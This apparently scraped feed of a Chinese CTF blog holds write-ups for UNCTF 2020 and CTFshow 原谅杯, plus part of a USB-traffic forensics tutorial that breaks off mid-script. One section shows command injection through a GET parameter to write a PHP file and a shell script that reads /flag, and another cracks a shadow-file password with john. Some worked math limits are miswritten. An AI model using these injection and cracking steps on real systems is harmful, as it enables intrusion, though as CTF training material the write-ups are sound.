死做题，不好用。他不服气。<br>扎总说，我说小朋友，你多长两个脑子来做我这新题。他做不动，他说你这个没用。<br>扎总说，我这个有用，他是数学，数学对计算机基础很重要，二百多个人做不出我这题。他非要和我试试。<br>扎总说，可以。扎总一说他啪站起来了，很快啊，然后上来一个左正蹬，一个右鞭腿，一个左刺拳。<br>扎总全部防出去了啊，防出去以后，自然是传统功夫以点到为止，右手把数学题摁在他鼻子上，没打他，扎总笑了一下，准备收拳。<br>后面我暂时编不下去了，你们来跟扎总打吧。<br>数学题，可能存在异议的，群里私聊 Hanser 的老公。</p><p>链接: <a href="https://pan.baidu.com/s/1nB8j4TN3HFe_SXvrwzyE2g">https://pan.baidu.com/s/1nB8j4TN3HFe_SXvrwzyE2g</a> 密码: ca04</p></blockquote><p>纯高数回忆录，复习了一把，采用<a href="https://www.wolframalpha.com/">wolframalpha</a>辅助计算。</p><p>第一个，$\lim \limits_{n \to \infty} (\cfrac{1+\sqrt[n]{2}+\cdots+\sqrt[n]{2020}}{2020})^n$：</p><p>计算到2020开n次方的求和不好表示，可以用wolframalpha观察规律：</p><p>$\lim \limits_{n \to \infty} (\cfrac{1+\sqrt[n]{2}}{2020})^n=\sqrt{2}$</p><p>$\lim \limits_{n \to \infty} (\cfrac{1+\sqrt[n]{2}+\sqrt[n]{3}}{2020})^n=\sqrt[3]{6}=\sqrt[3]{2\cdot3}$</p><p>$\lim \limits_{n \to \infty} (\cfrac{1+\sqrt[n]{2}+\sqrt[n]{3}+\sqrt[n]{4}}{2020})^n=\sqrt[4]{24}=\sqrt[4]{2\cdot3\cdot4}$</p><p>$\lim \limits_{n \to \infty} (\cfrac{1+\sqrt[n]{2}+\sqrt[n]{3}+\sqrt[n]{4}+\sqrt[n]{5}}{2020})^n=\sqrt[5]{120}=\sqrt[5]{2\cdot3\cdot4\cdot5}$</p><p>以此类推，$\lim \limits_{n \to \infty} (\cfrac{1+\sqrt[n]{2}+\cdots+\sqrt[n]{2020}}{2020})^n=\sqrt[2020]{2020!}$</p><p>第二个，$\lim \limits_{x \to +\infty} \cfrac{\int_{0}^{x}\text{d}u\int_{0}^{u}[u^2-3\sin(u-t)^2] \text{d}t }{x^8}$：</p><p>wolframalpha编写：</p><p><code>limit (integrate (integrate (u^2-3sin(u-t)^2),t=0 to u),u=0 to x)/(x^8) as x-&gt;+∞</code></p><p>计算得出：$\lim \limits_{x \to +\infty} \cfrac{\int_{0}^{x}\text{d}u\int_{0}^{u}[u^2-3\sin(u-t)^2] \text{d}t }{x^8}=\cfrac{1}{112}$</p><p>第三个，设 $\Omega:x^2+y^2 \leq 3z,1 \leq z \leq 4$，求 $\displaystyle\iiint_\Omega \cfrac{1}{\sqrt{x^2+y^2+z}}\text{d}v$：</p><p>转换到极坐标求解，设 $x=r\sin{\theta},y=r\cos{\theta}$：</p><p>wolframalpha编写：</p><p><code>(integrate dθ,θ=0 to 2*pi)(integrate r/sqrt(r^2+z) dr, r=0 to sqrt(3z))</code></p><p><code>integrate 2*pi*sqrt(z) dz, z=1 to 4</code></p><p>计算得出：</p><p>$\displaystyle\iiint_\Omega \cfrac{1}{\sqrt{x^2+y^2+z}}\text{d}v=\int_{1}^{4}\text{d}z\int_{0}^{2\pi}\text{d}\theta \int_{0}^{\sqrt{3z}}\cfrac{r}{r^2+z}\text{d}r=\int_{1}^{4}2\pi\sqrt{z}\text{d}z=\cfrac{28\pi}{3}$</p><p>最后，合并为<code>\sqrt[2020]&#123;2020!&#125;-\frac&#123;1&#125;&#123;112&#125;-\frac&#123;28\pi&#125;&#123;3&#125;</code>，md5值为flag。</p><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="baba-is-you"><a href="#baba-is-you" class="headerlink" title="baba_is_you"></a>baba_is_you</h3><blockquote><p>了解一下png文件格式</p></blockquote><p>16进制查看，文件尾有一串B站网址，访问，在评论区发现flag。</p><p>​    </p><h3 id="爷的历险记"><a href="#爷的历险记" class="headerlink" title="爷的历险记"></a>爷的历险记</h3><blockquote><p>RPG小游戏<br>爷把flag弄丢了, 你可以帮他找回来吗</p></blockquote><p>RPG小游戏，启动玩耍。</p><p>屋里屋外到处寻找线索，发现两个箱子，分部用base64解码出密码66668888和摩斯密码解码出密码23332333打开箱子拿奖励，依次勉强打过屋外主场景左边和下边两个场景的小boss，屋外主场景右下方商人处可以购买hint1和hint2，hint2提示查看游戏存档。</p><p>想到修改存档文件的方式，更改金钱以购买hint3。使用<a href="https://www.saveeditonline.com/">RPG存档在线修改器</a>修改rpgsave文件中的金钱属性值到最大值，再回到游戏加载存档，购买hint3即为flag。</p><p>​    </p><h3 id="阴阳人编码"><a href="#阴阳人编码" class="headerlink" title="阴阳人编码"></a>阴阳人编码</h3><p>发现含<code>就这.</code>、<code>就这¿</code>、<code>不会吧!</code>三种字符串，需要一点脑洞，联想到Ook编码，<a href="https://www.splitbrain.org/services/ook">在线解密</a>得flag。</p><p>​    </p><h3 id="躲猫猫"><a href="#躲猫猫" class="headerlink" title="躲猫猫"></a>躲猫猫</h3><blockquote><p>我躲好了，你来找我</p></blockquote><p>直接打开报错，右键压缩包打开，在sharedStrings.xml发现base64编码字符串，base64+url解码得flag。</p><p>​    </p><h3 id="YLB’s-CAPTCHA-签到题"><a href="#YLB’s-CAPTCHA-签到题" class="headerlink" title="YLB’s CAPTCHA - 签到题"></a>YLB’s CAPTCHA - 签到题</h3><blockquote><p>YLB同款验证码</p></blockquote><p>硬看到眼睛疼就能过了，可以考虑修改css配色方案降低难度。</p><p>​    </p><h3 id="撕坏的二维码"><a href="#撕坏的二维码" class="headerlink" title="撕坏的二维码"></a>撕坏的二维码</h3><blockquote><p>RPG小游戏<br>爷把flag弄丢了, 你可以帮他找回来吗</p></blockquote><p>部分遮盖的二维码，直接用QR Rearch识别出flag。</p><p>​    </p><h3 id="网络深处1"><a href="#网络深处1" class="headerlink" title="网络深处1"></a>网络深处1</h3><blockquote><p>好孩子不要上洋葱鸭</p></blockquote><p>三个文件，txt有一串数字，zip包加密，</p><p>Audacity分析wav文件，结合文件名“拨号音”，用<a href="https://github.com/ribt/dtmf-decoder">DTMF拨号音识别脚本</a>识别出wav的手机号码，解压得一个wav文件和txt文件，继续Audacity分析wav文件，切换到频谱图发现关键字<code>我是tupper</code>，</p><p>了解到Tupper为<a href="http://www.matrix67.com/blog/archives/301">自我指涉公式</a>，找到一个<a href="https://keelyhill.github.io/tuppers-formula/">在线还原图像网站</a>还原得flag。</p><p>​    </p><h3 id="mouse-click"><a href="#mouse-click" class="headerlink" title="mouse_click"></a>mouse_click</h3><blockquote><p>flag格式为unctf{<strong>*</strong>}，<strong>**</strong>中的字母统一为大写</p></blockquote><p>简单鼠标流量取证。</p><p>提取usb数据信息：</p><p><code>tshark -r mouse.pcapng -T fields -e usb.capdata &gt; usbdata.txt</code></p><p>提取坐标值脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">result = <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    line = line.strip()</span><br><span class="line">    <span class="keyword">if</span> line == <span class="string">&#x27;&#x27;</span> :<span class="comment">#忽略空行</span></span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    x = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    y = <span class="built_in">int</span>(line[<span class="number">9</span>:<span class="number">11</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt;<span class="number">127</span> :</span><br><span class="line">        y -= <span class="number">256</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    btn_flag = <span class="built_in">int</span>(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">1</span> :</span><br><span class="line">        result.write(<span class="built_in">str</span>(posx)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(posy)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">keys.close()</span><br><span class="line">result.close()</span><br></pre></td></tr></table></figure><p>运行：<code>python analyse.py</code></p><p>控制台画图：<code>gnuplot.exe -e &quot;plot &#39;result.txt&#39;&quot; -p</code></p><p>​    </p><h3 id="被删除的flag"><a href="#被删除的flag" class="headerlink" title="被删除的flag"></a>被删除的flag</h3><blockquote><p>flag被删除了，你能恢复它吗</p></blockquote><p>16进制查看，搜索<code>unctf</code>得flag。</p><p>​    </p><h3 id="你能破解我的密码吗"><a href="#你能破解我的密码吗" class="headerlink" title="你能破解我的密码吗"></a>你能破解我的密码吗</h3><blockquote><p>flag内容为密码的32位小写的md5，请用unctf{}包裹字符串</p></blockquote><p>shadow文件中倒数第二行，用john命令破解弱口令：</p><p><code>john --show shadow</code></p><p>得到密码，md5处理即flag。</p><p>​    </p><h3 id="EZ-IMAGE"><a href="#EZ-IMAGE" class="headerlink" title="EZ_IMAGE"></a>EZ_IMAGE</h3><p>手撸最终肯定能出来，不过学到更好用的自动化姿势（montage+gaps），适用于任何拼图题：</p><p>先把225张图用ImageMagick中的montage命令合成一张大图：</p><p><code>montage *.jpg -tile 15x15 -geometry 60x60+0+0 out.jpg</code></p><p>得到一张大图之后，用gaps来进行还原：</p><p><code>gaps --image=out.jpg --generations=40 --population=225 --size=60 --save</code></p><p>​    </p><h3 id="零"><a href="#零" class="headerlink" title="零"></a>零</h3><blockquote><p>我瞎了看不到flag了</p></blockquote><p><a href="https://lazzzaro.github.io/2020/05/24/misc-%E9%9B%B6%E5%AE%BD%E5%BA%A6%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%99/">零宽字符隐写</a>，可以在vim中用<code>vim -A xxx.txt</code>查看核实。</p><p>全选复制，用<a href="http://330k.github.io/misc_tools/unicode_steganography.html">在线工具</a>直接取出flag。</p><p>​    </p><h3 id="YLB绝密文件"><a href="#YLB绝密文件" class="headerlink" title="YLB绝密文件"></a>YLB绝密文件</h3><blockquote><p>提示1：需要提取出三个文件: *.pyc,*.py,*.zip<br>提示2：zip文件可以以原始数据的形式导出Hex值，再导入Winhex/010 Editor然后删去非Zip数据部分（自行百度Zip格式</p></blockquote><p>Wireshark查看流量包，追踪TCP流，分别在流11、流16和流20流提取出xor.py、secret.cpython-38.pyc和YLBSB.zip三个文件。</p><p>用uncompyle6还原pyc文件为secret.py文件拿到key值<code>YLBSB?YLBNB!</code>，再根据xor.py代码逻辑，将key与zip包中的YLBSB.xor文件16进制值异或，保存得到YLBSB.docx文件，打开得到flag。</p><p>​    </p><h3 id="倒影"><a href="#倒影" class="headerlink" title="倒影"></a>倒影</h3><p>16进制查看exe文件发现是jpg图，在尾部发现<code>4030B405</code>，即为倒着存入的一段16进制zip文件，取出16进制逆序还原，用ARCHPR纯数字跑出弱口令得到flag。</p><p>​    </p><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><h3 id="调查问卷"><a href="#调查问卷" class="headerlink" title="调查问卷"></a>调查问卷</h3><blockquote><p>请大家认真填写哟~ 只有几道，不多，最多占用大家两三分钟…<br>问卷地址：<a href="https://wj.qq.com/s2/7519766/6af6/">https://wj.qq.com/s2/7519766/6af6/</a><br>想要大家一起吐槽？<br>知乎链接：<a href="https://www.zhihu.com/question/429290669/answer/1564365629">https://www.zhihu.com/question/429290669/answer/1564365629</a></p></blockquote><p>反馈就是了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;2020年高校联合招新赛UNCTF&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;竞赛时间：&lt;/strong&gt; 2020年11月07日-14日&lt;/p&gt;
&lt;p&gt;后面几天没太看掉了下来，Rank: 23&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2020赛" scheme="https://lazzzaro.github.io/tags/2020%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow 原谅杯</title>
    <link href="https://lazzzaro.github.io/2020/11/12/match-CTFshow-%E5%8E%9F%E8%B0%85%E6%9D%AF/"/>
    <id>https://lazzzaro.github.io/2020/11/12/match-CTFshow-%E5%8E%9F%E8%B0%85%E6%9D%AF/</id>
    <published>2020-11-11T16:13:12.000Z</published>
    <updated>2021-01-24T13:30:59.541Z</updated>
    
    <content type="html"><![CDATA[<p>原谅杯比赛预告：<br>CTFshow 原谅杯<br>平台：<a href="https://ctf.show">https://ctf.show</a><br>开始：2020/11/11 00:00<br>结束：2020/11/11 23:59<br>内容：本次采用闯关模式，必须按顺序解题，否则无法欣赏狗血的爱情故事。<br>规则：<br>1 比赛期间可以随意讨论，wp须在比赛结束后发布，wp统一发布地址：<a href="https://wp.ctf.show">https://wp.ctf.show</a><br>2 公平竞技，独立比赛<br>3 服务器不要爆破，不要攻击服务器，不要扫描!!!<br>4 奖品：帽子一个(颜色随机)</p><hr><h3 id="原谅1"><a href="#原谅1" class="headerlink" title="原谅1"></a>原谅1</h3><blockquote><p>附件：yuanliang_1.zip</p></blockquote><p>压缩包有 story.zip 和 原谅1.png，群里hint+拟音解密emoji，密码1317bi77p9u，</p><p>解压拿到 1.jpg 和 剧情1.txt，stegsolve查看1.jpg的rgb通道发现flag。</p><p>​    </p><h3 id="原谅2"><a href="#原谅2" class="headerlink" title="原谅2"></a>原谅2</h3><blockquote><p>附件：yuanliang_2.zip</p></blockquote><p>压缩包有未加密的 hint.txt，<a href="http://www.dmaku.com/tool-huoxing.html">火星文解密</a>得到解压密钥，解压拿到flag.txt内容。</p><p>​    </p><h3 id="原谅3-来份色图"><a href="#原谅3-来份色图" class="headerlink" title="原谅3_来份色图"></a>原谅3_来份色图</h3><blockquote><p>附件：yuanliang_3.zip</p><p>Hint1: 阿狸2020年11月11日10:49在群里说得对</p><p>Hint2: 第一步、色图一分为二（常见文件格式/头尾了解一下）；第二步、rrggbbrrggbbrrggbb…；第三步、你的工具更新了吗</p></blockquote><p>压缩包有未加密的setu.zip，解压得到setu.png，010editor分析存在双图，foremost分解得到两张png。</p><p>将setu.zip用zsteg进行LSB分析，发现隐藏的png图，提取出新png图1。</p><p>结合盲水印提示，将foremost分解出的两张png同样用zsteg进行LSB分析，分别提取出新png图2、图3。</p><p>用github上各种盲水印脚本，使用<a href="https://github.com/chishaxie/BlindWaterMark">正确脚本</a>尝试解图1、图2、图3，有一种情况能出flag图。</p><p>​    </p><h3 id="原谅4"><a href="#原谅4" class="headerlink" title="原谅4"></a>原谅4</h3><blockquote><p>列目录可以看到剧情文件</p><p>Hint1: 老前辈说过“最安全的系统就是什么都没有”，我把没用的命令都删了，看你还怎么执行</p><p>Hint2: 你知道系统环境变量里的PATH是干什么的吗？</p></blockquote><p>GET方式传入参数xbx，发现只能用<code>ls</code>列目录，尝试用<code>echo</code>写入文件成功，写入<code>phpinfo()</code>：</p><p><code>echo &#39;&lt;?php phpinfo();?&gt;&#39; &gt; phpinfo.php</code></p><p>访问发现存在open_basedir限制，试过各种open_basedir绕过、disable_function写bypass读<code>/flag</code>均不成功。</p><p>提示环境变量，查看：<code>echo $PATH</code>，分别到各路径下查看，仅存<code>ls/rm/sh</code>三种命令（无法执行常用命令的原因）。</p><p>有<code>sh</code>命令，且可写入文件，尝试往根目录写入shell脚本：</p><p><code>echo -e &quot;%23!/bin/sh\nwhile read line\ndo\necho \$line\ndone &lt; /flag&quot; &gt; ../../../read</code></p><p>成功写入，再执行<code>/bin/sh ../../../read</code>得flag。</p><p>赛后还学到其他各种骚姿势。</p><p>​    </p><h3 id="原谅5-6"><a href="#原谅5-6" class="headerlink" title="原谅5-6"></a>原谅5-6</h3><p>未解。</p><p>​    </p><h3 id="原谅7-baby加密"><a href="#原谅7-baby加密" class="headerlink" title="原谅7_baby加密"></a>原谅7_baby加密</h3><blockquote><p>encrypt.exe -e flag.txt</p><p>附件：encrypt.exe、encrypted_flag.txt</p><p>Hint1: maybe des?</p></blockquote><p>IDA跟进main函数，发现24位字符串<code>123456788765432112345678</code>，再跟进加密函数<code>sub_401E16</code>：</p><p><code>sub_401E16((__int64)&amp;v13, (__int64)argv, v44, (__int64)File, (__int64)&amp;v14, 1, v8, v9, v10, v11, 1);</code></p><p>发现传入的24为字符串分为三组分别通过函数<code>sub_401B7A</code>处理：</p><p><code>sub_401B7A((void *)a1, (const void *)a2, v16, v14, 1);</code><br><code>sub_401B7A((void *)a1, (const void *)a2, v16 + 8, v14, 0);</code><br><code>sub_401B7A((void *)a1, (const void *)a2, v16 + 16, v14, 1);</code></p><p>结合提示DES，可知为3DES加密（24位密钥，且第一步处理会将密钥分成三组密钥分别处理，第一组解密，第二组加密，第三组解密，对应<code>sub_401E16</code>最后一个参数值）。</p><p>用<a href="http://tripledes.online-domain-tools.com/">在线解密工具</a>解密密文即可得flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;原谅杯比赛预告：&lt;br&gt;CTFshow 原谅杯&lt;br&gt;平台：&lt;a href=&quot;https://ctf.show&quot;&gt;https://ctf.show&lt;/a&gt;&lt;br&gt;开始：2020/11/11 00:00&lt;br&gt;结束：2020/11/11 23:59&lt;br&gt;内容：本次采用闯关模</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2020赛" scheme="https://lazzzaro.github.io/tags/2020%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>流量分析</title>
    <link href="https://lazzzaro.github.io/2020/11/08/misc-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>https://lazzzaro.github.io/2020/11/08/misc-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2020-11-07T17:01:00.000Z</published>
    <updated>2021-05-18T17:22:05.160Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><h3 id="USB流量"><a href="#USB流量" class="headerlink" title="USB流量"></a>USB流量</h3><ul><li><h4 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h4><p>USB协议数据部分在Leftover Capture Data域中，数据长度为<strong>八个字节</strong>。其中键盘击键信息集中在<strong>第三个字节</strong>中。键位映射关系参考：<a href="https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html">《USB键盘协议中键码》中的HID Usage ID</a>。</p><p><strong>步骤</strong>：</p><ol><li><p>tshark命令提取cap data</p><p><code>tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</code></p><p><code>tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code>（去空行）</p></li><li><p>将数据还原成键位</p><p>提取出来的数据可能会带冒号，也可能不带，但是一般的脚本都会按照有冒号的数据来识别。</p><p>有冒号时提取数据的<code>[6:8]</code>，无冒号时数据在<code>[4:6]</code>。</p><p>加冒号：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">a=f.readline().strip()</span><br><span class="line"><span class="keyword">if</span> a:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>:</span><br><span class="line">out=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">fi.write(out)</span><br><span class="line">fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure><p>还原键位：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="comment">#脚本1</span></span><br><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;&quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line"><span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line"><span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">output += mappings[n]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;output :\n&#x27;</span> + output</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span 